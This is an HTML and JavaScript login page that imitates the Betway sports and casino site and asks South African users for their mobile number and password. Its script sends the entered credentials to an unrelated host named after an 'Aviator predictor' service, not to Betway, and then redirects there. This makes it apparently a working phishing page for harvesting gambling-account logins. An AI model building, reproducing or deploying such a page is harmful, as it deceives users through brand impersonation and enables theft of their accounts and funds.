<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Betway Login</title>
    <!-- FAVICON FIX -->
    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🎰</text></svg>" />
    <!-- FONT AWESOME FIX - Different CDN -->
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v6.5.0/css/all.css" />
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            background: #0a0a0a;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        .login-container {
            background: #141414;
            padding: 45px 35px 40px;
            border-radius: 16px;
            width: 100%;
            max-width: 420px;
            border: 1px solid #2a2a2a;
            box-shadow: 0 25px 70px rgba(0, 0, 0, 0.95);
            position: relative;
        }

        .logo {
            text-align: center;
            margin-bottom: 35px;
        }

        .logo h1 {
            font-size: 42px;
            font-weight: 900;
            color: #ffffff;
            letter-spacing: 1px;
        }

        .logo h1 span {
            color: #f5c518;
        }

        .logo p {
            color: #f5c518;
            font-size: 10px;
            letter-spacing: 6px;
            text-transform: uppercase;
            margin-top: 2px;
            font-weight: 300;
        }

        .login-heading {
            color: #ffffff;
            font-size: 24px;
            font-weight: 700;
            margin-bottom: 25px;
            text-align: center;
        }

        .input-group {
            margin-bottom: 18px;
            position: relative;
        }

        .input-group label {
            display: block;
            color: #bbbbbb;
            font-size: 13px;
            font-weight: 600;
            margin-bottom: 6px;
            letter-spacing: 0.3px;
        }

        .input-group input {
            width: 100%;
            padding: 14px 16px;
            background: #0d0d0d;
            border: 2px solid #2a2a2a;
            border-radius: 10px;
            color: #ffffff;
            font-size: 15px;
            transition: all 0.3s ease;
            outline: none;
        }

        .input-group input:focus {
            border-color: #f5c518;
            background: #111;
            box-shadow: 0 0 25px rgba(245, 197, 24, 0.06);
        }

        .input-group input::placeholder {
            color: #555;
            font-size: 14px;
        }

        .input-group .input-icon {
            position: absolute;
            right: 16px;
            bottom: 14px;
            color: #555;
            font-size: 18px;
        }

        .forgot-row {
            display: flex;
            justify-content: space-between;
            margin: 12px 0 22px;
        }

        .forgot-row a {
            color: #aaaaaa;
            font-size: 13px;
            text-decoration: none;
            transition: 0.3s;
        }

        .forgot-row a:hover {
            color: #f5c518;
        }

        .login-btn {
            width: 100%;
            padding: 16px;
            background: #00a651;
            border: none;
            border-radius: 10px;
            color: #ffffff;
            font-size: 18px;
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 2px;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 8px 30px rgba(0, 166, 81, 0.3);
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
        }

        .login-btn:hover:not(:disabled) {
            background: #00c45a;
            transform: scale(1.02);
            box-shadow: 0 12px 40px rgba(0, 166, 81, 0.45);
        }

        .login-btn:active:not(:disabled) {
            transform: scale(0.97);
        }

        .login-btn:disabled {
            opacity: 0.7;
            cursor: not-allowed;
            transform: scale(0.98);
        }

        .spinner {
            display: none;
            width: 24px;
            height: 24px;
            border: 3px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top-color: #ffffff;
            animation: spin 0.8s ease-in-out infinite;
        }

        .spinner.active {
            display: inline-block;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .btn-text {
            display: inline-block;
        }

        .divider {
            display: flex;
            align-items: center;
            margin: 28px 0 22px;
            gap: 15px;
        }

        .divider::before,
        .divider::after {
            content: '';
            flex: 1;
            height: 1px;
            background: #2a2a2a;
        }

        .divider span {
            color: #555;
            font-size: 11px;
            text-transform: uppercase;
            letter-spacing: 2px;
        }

        .signup-text {
            text-align: center;
            color: #aaaaaa;
            font-size: 15px;
        }

        .signup-text a {
            color: #f5c518;
            font-weight: 700;
            text-decoration: none;
            font-size: 16px;
            margin-left: 4px;
        }

        .signup-text a:hover {
            text-decoration: underline;
        }

        #message {
            padding: 12px 16px;
            border-radius: 10px;
            margin-bottom: 18px;
            font-size: 14px;
            display: none;
            text-align: center;
            font-weight: 600;
        }

        #message.error {
            display: block;
            background: rgba(255, 0, 0, 0.15);
            border: 1px solid rgba(255, 0, 0, 0.3);
            color: #ff6b6b;
        }

        #message.success {
            display: block;
            background: rgba(0, 166, 81, 0.15);
            border: 1px solid rgba(0, 166, 81, 0.3);
            color: #00c45a;
        }

        .loading-overlay {
            display: none;
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(20, 20, 20, 0.85);
            border-radius: 16px;
            z-index: 10;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            gap: 20px;
        }

        .loading-overlay.active {
            display: flex;
        }

        .loading-overlay .big-spinner {
            width: 50px;
            height: 50px;
            border: 4px solid rgba(245, 197, 24, 0.2);
            border-radius: 50%;
            border-top-color: #f5c518;
            animation: spin 0.8s ease-in-out infinite;
        }

        .loading-overlay p {
            color: #f5c518;
            font-size: 16px;
            font-weight: 600;
            letter-spacing: 1px;
        }

        @media (max-width: 480px) {
            .login-container {
                padding: 30px 20px;
            }
            .logo h1 {
                font-size: 34px;
            }
            .forgot-row {
                flex-direction: column;
                gap: 6px;
                align-items: center;
            }
            .login-heading {
                font-size: 20px;
            }
        }
    </style>
</head>
<body>

    <div class="login-container">

        <div class="loading-overlay" id="loadingOverlay">
            <div class="big-spinner"></div>
            <p>Processing your request...</p>
        </div>

        <div class="logo">
            <h1>BET<span>WAY</span></h1>
            <p>Sports · Casino · Games</p>
        </div>

        <div class="login-heading">Login</div>

        <div id="message"></div>

        <div class="input-group">
            <label>+27 Mobile Number</label>
            <input type="tel" id="mobileNumber" placeholder="Enter your mobile number" />
            <span class="input-icon"><i class="fas fa-phone"></i></span>
        </div>

        <div class="input-group">
            <label>Enter Password</label>
            <input type="password" id="password" placeholder="Enter your password" />
            <span class="input-icon"><i class="fas fa-lock"></i></span>
        </div>

        <div class="forgot-row">
            <a href="#">Forgot Username?</a>
            <a href="#">Forgot Password?</a>
        </div>

        <button class="login-btn" id="loginBtn">
            <span class="spinner" id="spinner"></span>
            <span class="btn-text" id="btnText">Login</span>
        </button>

        <div class="divider">
            <span>Don't have an account yet?</span>
        </div>

        <p class="signup-text">
            <a href="#">Sign Up</a>
        </p>

    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            
            console.log('✅ Page loaded!');

            const mobileInput = document.getElementById('mobileNumber');
            const passwordInput = document.getElementById('password');
            const loginBtn = document.getElementById('loginBtn');
            const spinner = document.getElementById('spinner');
            const btnText = document.getElementById('btnText');
            const messageDiv = document.getElementById('message');
            const loadingOverlay = document.getElementById('loadingOverlay');

            function showMessage(text, type) {
                messageDiv.textContent = text;
                messageDiv.className = type;
                console.log('📢 Message:', text);
            }

            function hideMessage() {
                messageDiv.textContent = '';
                messageDiv.className = '';
            }

            function showLoading() {
                loginBtn.disabled = true;
                spinner.classList.add('active');
                btnText.textContent = 'Logging in...';
                loadingOverlay.classList.add('active');
            }

            function hideLoading() {
                loginBtn.disabled = false;
                spinner.classList.remove('active');
                btnText.textContent = 'Login';
                loadingOverlay.classList.remove('active');
            }

            async function handleLogin(event) {
                if (event) {
                    event.preventDefault();
                }

                console.log('🔑 Login button clicked!');

                const mobileNumber = mobileInput.value.trim();
                const password = passwordInput.value.trim();

                console.log('📱 Mobile:', mobileNumber);

                if (!mobileNumber || !password) {
                    showMessage('⚠️ Please enter both mobile number and password.', 'error');
                    return;
                }

                const mobileRegex = /^(\+27|0)[6-8][0-9]{8}$/;
                if (!mobileRegex.test(mobileNumber)) {
                    showMessage('⚠️ Please enter a valid SA number (e.g., 0712345678)', 'error');
                    return;
                }

                hideMessage();
                showLoading();
                console.log('⏳ Loading started...');

                try {
                    const apiUrl = 'https://betwayaviatorpredictor-production.up.railway.app/api/login';
                    console.log('🌐 Sending to:', apiUrl);

                    const response = await fetch(apiUrl, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            mobileNumber: mobileNumber,
                            password: password
                        })
                    });

                    console.log('📡 Response status:', response.status);

                    const data = await response.json();
                    console.log('📦 Response data:', data);

                    hideLoading();

                    if (data.success) {
                        showMessage('✅ Login successful! Redirecting...', 'success');
                        showLoading();
                        setTimeout(() => {
                            window.location.href = 'https://betwayaviatorpredictor-production.up.railway.app';
                        }, 2000);
                    } else {
                        showMessage('❌ ' + (data.message || 'Login failed. Please try again.'), 'error');
                    }

                } catch (error) {
                    console.error('❌ Error:', error);
                    hideLoading();
                    showMessage('❌ Network error. Please check your connection.', 'error');
                }
            }

            loginBtn.addEventListener('click', function(e) {
                console.log('🖱️ Button clicked!');
                handleLogin(e);
            });

            console.log('✅ Button listener attached!');

            document.addEventListener('keypress', function(e) {
                if (e.key === 'Enter') {
                    const active = document.activeElement;
                    if (active === mobileInput || active === passwordInput) {
                        console.log('⌨️ Enter key pressed!');
                        handleLogin(e);
                    }
                }
            });

            mobileInput.addEventListener('input', function() {
                if (messageDiv.className === 'error') {
                    hideMessage();
                }
            });
            
            passwordInput.addEventListener('input', function() {
                if (messageDiv.className === 'error') {
                    hideMessage();
                }
            });

            console.log('✅ All systems ready!');

        });
    </script>

</body>
</html>
